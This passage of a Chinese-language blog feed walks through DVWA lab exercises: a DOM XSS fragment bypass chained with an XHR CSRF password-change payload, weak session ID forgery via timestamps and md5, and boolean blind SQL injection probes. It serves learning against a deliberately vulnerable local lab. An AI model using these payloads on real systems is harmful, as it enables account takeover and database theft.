&lt;span class="c1">// Is there any input?
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="nx">array_key_exists&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s2">&amp;#34;default&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$_GET&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="o">!&lt;/span>&lt;span class="nx">is_null&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;default&amp;#39;&lt;/span> &lt;span class="p">])&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1"># White list the allowable languages
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">switch&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;default&amp;#39;&lt;/span>&lt;span class="p">])&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="s2">&amp;#34;French&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="s2">&amp;#34;English&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="s2">&amp;#34;German&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="s2">&amp;#34;Spanish&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="c1"># ok
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">default&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="nx">header&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;location: ?default=English&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">exit&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>白名单？这我有点不懂了。想一想先。&lt;/p>
&lt;p>想 bypass 显然不能等进入 &lt;code>switch&lt;/code>，只能在 &lt;code>if&lt;/code> 这里就直接过，所以问题就是&lt;code>array_key_exists&lt;/code>和&lt;code>is_null&lt;/code>这两个函数能不能 bypass 。&lt;/p>
&lt;p>没什么用的分析略，行不通。&lt;/p>
&lt;p>不过还是有办法，可以用 URL 里的 Fragment。（url里的&lt;code>#fragment&lt;/code>部分）。因为JS代码里是这么写的：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-js" data-lang="js">&lt;span class="kd">var&lt;/span> &lt;span class="nx">lang&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">location&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">href&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">substring&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">location&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">href&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">indexOf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;default=&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>直接从&lt;code>href&lt;/code>里取&lt;code>substring&lt;/code>，偏移值是&lt;code>href.indexOf&lt;/code>获得，并没有考虑是从 QueryString 还是 Fragment 取值。所以完全可以把原先的payload加上一个&lt;code>#&lt;/code>解决问题。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-09/image-20220428145238725.png"
width="676"
height="169"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-09/image-20220428145238725_huaa39aeb0cde7b5644c845b1eb10671f0_7523_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-09/image-20220428145238725_huaa39aeb0cde7b5644c845b1eb10671f0_7523_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220428145238725"
class="gallery-image"
data-flex-grow="400"
data-flex-basis="960px"
>&lt;/p>
&lt;p>好吧，我承认看了下帮助，差点钻了php的牛角尖，去硬找方法 bypass 服务端的检查。&lt;/p>
&lt;h3 id="csrf解题">CSRF：解题&lt;/h3>
&lt;p>主要是解决 Cookies 默认 &lt;code>samesite: lax&lt;/code> 导致的 xhr 行不通的问题。&lt;/p>
&lt;p>把 payload 改成下面这样。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-html" data-lang="html">&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">option&lt;/span>&lt;span class="p">&amp;gt;&amp;lt;/&lt;/span>&lt;span class="nt">select&lt;/span>&lt;span class="p">&amp;gt;&amp;lt;&lt;/span>&lt;span class="nt">img&lt;/span> &lt;span class="na">src&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;&amp;#34;&lt;/span> &lt;span class="na">onerror&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;let xhr = new XMLHttpRequest(); xhr.open(&amp;#39;get&amp;#39;, &amp;#39;http://localhost:8080/vulnerabilities/csrf/?password_new=xss&amp;amp;password_conf=xss&amp;amp;Change=Change&amp;#39;); xhr.withCredentials=true; xhr.send();&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-09/image-20220428150236560.png"
width="1412"
height="76"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-09/image-20220428150236560_hub28227194eb20365c2c5c05d48f1819b_17488_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-09/image-20220428150236560_hub28227194eb20365c2c5c05d48f1819b_17488_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220428150236560"
class="gallery-image"
data-flex-grow="1857"
data-flex-basis="4458px"
>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-09/image-20220428150255678.png"
width="405"
height="86"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-09/image-20220428150255678_hu78ed2e3ce39efde3832f99f036b3e25d_6191_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-09/image-20220428150255678_hu78ed2e3ce39efde3832f99f036b3e25d_6191_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220428150255678"
class="gallery-image"
data-flex-grow="470"
data-flex-basis="1130px"
>&lt;/p>
&lt;p>然后验证下修改的密码&lt;code>xss&lt;/code>是否有效。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-09/image-20220428150319091.png"
width="219"
height="164"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-09/image-20220428150319091_hu37c43fb2e344f0a81362d8beb3bde604_3637_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-09/image-20220428150319091_hu37c43fb2e344f0a81362d8beb3bde604_3637_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220428150319091"
class="gallery-image"
data-flex-grow="133"
data-flex-basis="320px"
>&lt;/p>
&lt;p>相应的，提高到 Medium 和 High 难度其实也没有难度了。&lt;/p>
&lt;p>Medium难度的 CSRF 只检查了 Host，XSS 方式发起的 CSRF 攻击无法通过检查同源和&lt;code>Host&lt;/code>来解决。但严格检查 &lt;code>Referer&lt;/code> 的话还是有可能发现的。&lt;/p>
&lt;p>High 难度的 CSRF 添加了 &lt;code>csrf_token&lt;/code>，但是 XSS 方式发起攻击完全可以 xhr 请求到表单页面的 HTML，也就可以拿到 token，&lt;code>csrf_token&lt;/code> 无法防御。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>这个 XSS 题花样还是有点少，我还是挺期待能把大佬玩出花的 XSS payload 都学一学在什么场景玩，什么原因研发出来的。&lt;/p>
&lt;p>将来有机会应该会找找有没有比较好玩的 XSS 靶场练练手。&lt;/p></description></item><item><title>DVWA上手记录-弱会话ID</title><link>https://nnnewb.github.io/blog/p/get-start-dvwa-08/</link><pubDate>Thu, 28 Apr 2022 12:59:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/get-start-dvwa-08/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>感觉是比较鸡的问题，快速过一下。&lt;/p>
&lt;h2 id="原理">原理&lt;/h2>
&lt;p>会话ID规律太明显导致被伪造。比如说直接把会话ID设置成数字的，那就有可能被枚举出别的用户的会话了。&lt;/p>
&lt;h2 id="解题">解题&lt;/h2>
&lt;h3 id="low难度">Low难度&lt;/h3>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-08/image-20220428115329825.png"
width="682"
height="177"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-08/image-20220428115329825_huc8db39018015ddcc66043fbd6f8bb009_15290_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-08/image-20220428115329825_huc8db39018015ddcc66043fbd6f8bb009_15290_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220428115329825"
class="gallery-image"
data-flex-grow="385"
data-flex-basis="924px"
>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-08/image-20220428115338241.png"
width="205"
height="50"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-08/image-20220428115338241_hub3bdc172484ad173fa1fcfe199d17696_2772_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-08/image-20220428115338241_hub3bdc172484ad173fa1fcfe199d17696_2772_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220428115338241"
class="gallery-image"
data-flex-grow="410"
data-flex-basis="984px"
>&lt;/p>
&lt;p>再点一次出现&lt;code>2&lt;/code>。这就没啥好解的了。&lt;/p>
&lt;h3 id="medium难度">Medium难度&lt;/h3>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-08/image-20220428115508774.png"
width="238"
height="64"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-08/image-20220428115508774_hu2d7867434da2899efffea03963ff20db_3994_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-08/image-20220428115508774_hu2d7867434da2899efffea03963ff20db_3994_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220428115508774"
class="gallery-image"
data-flex-grow="371"
data-flex-basis="892px"
>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-08/image-20220428115516730.png"
width="232"
height="67"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-08/image-20220428115516730_hu14d70ec5c3be612f909210bf229b9e16_4002_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-08/image-20220428115516730_hu14d70ec5c3be612f909210bf229b9e16_4002_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220428115516730"
class="gallery-image"
data-flex-grow="346"
data-flex-basis="831px"
>&lt;/p>
&lt;p>递增，这个数字模式看起来有点像 Unix 时间戳：&lt;/p>
&lt;ul>
&lt;li>位数不长不短&lt;/li>
&lt;li>16 开头&lt;/li>
&lt;li>两个id递增的间隔和我映像里操作的时间比较接近&lt;/li>
&lt;/ul>
&lt;p>有了怀疑就看一看，转成时间戳后证明了我的猜测。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-08/image-20220428115606157.png"
width="377"
height="100"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-08/image-20220428115606157_hu8e654e9b65765de6a1671d6f0ef292fa_5605_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-08/image-20220428115606157_hu8e654e9b65765de6a1671d6f0ef292fa_5605_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220428115606157"
class="gallery-image"
data-flex-grow="377"
data-flex-basis="904px"
>&lt;/p>
&lt;p>剩下就是枚举出可能的用户ID了。枚举的技巧就是从接近现在的时间往回找，离得越远越不可能。区间也可以限制在比较小的范围比如一周或者一个月。&lt;/p>
&lt;h3 id="high难度">High难度&lt;/h3>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-08/image-20220428114951254.png"
width="698"
height="210"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-08/image-20220428114951254_hu47f3f84eefbddeb6db43a6e91428e52f_17677_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-08/image-20220428114951254_hu47f3f84eefbddeb6db43a6e91428e52f_17677_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220428114951254"
class="gallery-image"
data-flex-grow="332"
data-flex-basis="797px"
>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-08/image-20220428114940081.png"
width="451"
height="71"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-08/image-20220428114940081_hu09ffa34a1db06d50fc97ba56b63d400d_6730_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-08/image-20220428114940081_hu09ffa34a1db06d50fc97ba56b63d400d_6730_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220428114940081"
class="gallery-image"
data-flex-grow="635"
data-flex-basis="1524px"
>&lt;/p>
&lt;p>点击generate之后拿到一个&lt;code>Set-Cookie&lt;/code>，观察&lt;code>dvwaSession&lt;/code>内容怀疑是某种哈希，直接贴cmd5后发现是数字&lt;code>2&lt;/code>。再点击一次后得到数字&lt;code>3&lt;/code>。&lt;/p>
&lt;p>所以规律就是&lt;code>1,2,3,4,5...&lt;/code>这样的序列了，可以通过&lt;code>md5('1')&lt;/code>这样的方式伪造出用户ID为1的用户的会话。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>我觉得应该没人干这种蠢事了。不过确实还是有人用随机数或者随机字节当会话ID的，用的还是&lt;code>math.random&lt;/code>而不是&lt;code>crypto.random&lt;/code>。我寻思这种虽然可能存在隐患，但要拿到随机种子才有机会利用吧。如果种子选的不好比如&lt;code>0&lt;/code>，或者很容易猜出来比如开机时间+一段启动服务的时间偏差，精度秒。那做好随机迭代次数估计（比如1年前的随机种子，你要取头几个随机值肯定是无效的，因为会话有过期时间，根据网站热度可以估计一个大概的范围（已经取了N~M随机数），尝试N+x次的随机数就行）的话，应该还是有机会枚举出来的，我猜。&lt;/p>
&lt;p>好了，WeakSessionID 这题就这样吧。&lt;/p></description></item><item><title>DVWA上手记录-SQL盲注</title><link>https://nnnewb.github.io/blog/p/get-start-dvwa-07/</link><pubDate>Thu, 28 Apr 2022 11:30:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/get-start-dvwa-07/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>SQL盲注会比一般的注入难度高很多，特别是经验不足的时候可以尝试的 payload 有限，就算有注入点也很难靠手里积累的那点 payload 测出来。一般这种时候用工具会好得多。&lt;/p>
&lt;h2 id="原理">原理&lt;/h2>
&lt;p>SQL盲注指的是存在SQL注入，但SQL错误不回显。这种情况下报错攻击无效而且构造有效的 payload 会比较困难。但还是可以通过几个方面确定执行结果：&lt;/p>
&lt;ol>
&lt;li>页面显示内容。比如当SQL错误发生或&lt;code>WHERE&lt;/code>、&lt;code>ON&lt;/code>这样的条件子句不满足时和正常执行时网页内容不同。&lt;/li>
&lt;li>如果正常执行和错误都返回一样的页面，还可以通过时间来判断SQL是否被执行，比如构造一个执行很慢的 payload 让 SQL 服务器跑，如果返回时间比正常时间久就说明SQL被执行了。&lt;/li>
&lt;li>可能还有其他的？&lt;/li>
&lt;/ol>
&lt;p>盲注还有个问题就是注入的查询可能不回显到前端，所以直接 &lt;code>UNION&lt;/code> 一个查询曝出所有的表和列是不太可能的。但如果存在盲注的话至少会有一个比特的观测窗口，所以还是存在一个字符一个字符试过去的办法，比如表名第一个字符是&lt;code>a&lt;/code>的表是否存在，表名第一个字符是&lt;code>b&lt;/code>的表是否存在，如此如此。虽然慢而且对一些无法枚举的字段（比如存的是unicode，那总不能遍历整个码表；或者 &lt;code>int&lt;/code>、&lt;code>float&lt;/code>这样取值范围太大的类型）没辙。&lt;/p>
&lt;h2 id="解题">解题&lt;/h2>
&lt;h3 id="low难度收集信息">Low难度：收集信息&lt;/h3>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220427165553250.png"
width="680"
height="263"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220427165553250_hu68e498a1133389b005a60b1455865bff_21821_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220427165553250_hu68e498a1133389b005a60b1455865bff_21821_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220427165553250"
class="gallery-image"
data-flex-grow="258"
data-flex-basis="620px"
>&lt;/p>
&lt;p>一个普通表单，尝试输入数字。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220427165613795.png"
width="308"
height="116"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220427165613795_hu7dd84795174df6ca381a743739fa4e6f_2858_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220427165613795_hu7dd84795174df6ca381a743739fa4e6f_2858_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220427165613795"
class="gallery-image"
data-flex-grow="265"
data-flex-basis="637px"
>&lt;/p>
&lt;p>逻辑应该是检测这个用户id是否存在于数据库中，随便乱打个数字看看。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220427165723361.png"
width="631"
height="280"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220427165723361_hud0ddf149c67d609f3993862f6211fe66_22979_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220427165723361_hud0ddf149c67d609f3993862f6211fe66_22979_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220427165723361"
class="gallery-image"
data-flex-grow="225"
data-flex-basis="540px"
>&lt;/p>
&lt;p>看下目标是什么。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220427165744902.png"
width="455"
height="90"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220427165744902_hu54a233f6dacf4b2d5441110f27ac7522_3798_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220427165744902_hu54a233f6dacf4b2d5441110f27ac7522_3798_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220427165744902"
class="gallery-image"
data-flex-grow="505"
data-flex-basis="1213px"
>&lt;/p>
&lt;p>猜解数据库版本。接着试一试是什么类型的注入，已知这个表单回显是存在/不存在，所以拼一个 &lt;code>' or 1=1; --&lt;/code> 看看，把条件变成恒真。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220427165955690.png"
width="503"
height="157"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220427165955690_hud319f5e9c130be7012bdc27ceda0d782_8803_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220427165955690_hud319f5e9c130be7012bdc27ceda0d782_8803_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220427165955690"
class="gallery-image"
data-flex-grow="320"
data-flex-basis="768px"
>&lt;/p>
&lt;p>有效。&lt;/p>
&lt;h3 id="low难度解题">Low难度：解题&lt;/h3>
&lt;p>用 &lt;code>or&lt;/code> 连接一个子查询，&lt;code>SELECT EXISTS(SELECT * FROM sys.version WHERE mysql_version LIKE '5%'); --&lt;/code>。这个查询会判断是MySQL的版本是不是5开头。依次类推很快就能解出MySQL版本号。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">&amp;#39; or (SELECT EXISTS(SELECT * FROM sys.version WHERE mysql_version LIKE &amp;#39;5%&amp;#39;)); --
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>但是很快发现行不通，因为没有权限访问 &lt;code>sys&lt;/code> 这个系统库（没有报错，我只能猜是这样）。&lt;/p>
&lt;p>想了想再谷歌了一下盲注的payloads之后还行没什么头绪，&lt;code>union&lt;/code>大概是不行的，因为回显只有exists和missing两种状态，union查出来也看不到。再翻了一下怎么用SQL查询MySQL版本之后发现除了&lt;code>show variables&lt;/code>和&lt;code>sys.version&lt;/code>之外，还可以试试&lt;code>version&lt;/code>函数。用&lt;code>SELECT SUBSTR(VERSION(),1,1)='5'&lt;/code>，然后逐个位判断（最好是先判断出这个字符串长度，用&lt;code>length(version())&amp;gt;1&lt;/code>这样的 payload。）&lt;/p>
&lt;p>于是做出下面一系列payload（mysql版本号是&lt;code>x.y.z&lt;/code>格式，肯定不低于5位，直接从5开始判断）。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">&amp;#39; or (SELECT LENGTH(VERSION())&amp;gt;5); -- true
&amp;#39; or (SELECT LENGTH(VERSION())&amp;gt;6); -- false
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>只用了两个 payload 就确定了长度是 6。&lt;/p>
&lt;p>接着判断第一位是不是5（因为5.x还是最常用的MySQL版本），后面逐位判断。（这里略了尝试的部分）&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">&amp;#39; or (SELECT SUBSTR(VERSION(),1,1)=&amp;#39;5&amp;#39;); -- true
&amp;#39; or (SELECT SUBSTR(VERSION(),2,1)=&amp;#39;.&amp;#39;); -- true
&amp;#39; or (SELECT SUBSTR(VERSION(),3,1)=&amp;#39;7&amp;#39;); -- true
&amp;#39; or (SELECT SUBSTR(VERSION(),4,1)=&amp;#39;.&amp;#39;); -- true
&amp;#39; or (SELECT SUBSTR(VERSION(),5,1)=&amp;#39;3&amp;#39;); -- true
&amp;#39; or (SELECT SUBSTR(VERSION(),6,1)=&amp;#39;7&amp;#39;); -- true
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>所以数据库版本号是 &lt;code>5.7.37&lt;/code>。&lt;/p>
&lt;p>这种无聊的爆破工作显然是应该交给脚本的。之后研究sqlmap的时候会再回头看看怎么用sqlmap盲注这里。&lt;/p>
&lt;h3 id="medium难度收集信息">Medium难度：收集信息&lt;/h3>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220428092639212.png"
width="676"
height="262"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220428092639212_hudf0870afea0dcfc1e3e4109bbd719b87_21982_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220428092639212_hudf0870afea0dcfc1e3e4109bbd719b87_21982_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220428092639212"
class="gallery-image"
data-flex-grow="258"
data-flex-basis="619px"
>&lt;/p>
&lt;p>和SQL注入题的medium难度一模一样。&lt;/p>
&lt;h3 id="medium难度解题">Medium难度：解题&lt;/h3>
&lt;p>还是老样子，复制出请求，尝试提交个数字型注入。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-js" data-lang="js">&lt;span class="kr">await&lt;/span> &lt;span class="nx">fetch&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;http://localhost:8080/vulnerabilities/sqli_blind/&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="s2">&amp;#34;headers&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="s2">&amp;#34;accept&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;accept-language&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;cache-control&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;no-cache&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;content-type&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;application/x-www-form-urlencoded&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;pragma&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;no-cache&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;sec-ch-ua&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;\&amp;#34; Not A;Brand\&amp;#34;;v=\&amp;#34;99\&amp;#34;, \&amp;#34;Chromium\&amp;#34;;v=\&amp;#34;100\&amp;#34;, \&amp;#34;Microsoft Edge\&amp;#34;;v=\&amp;#34;100\&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
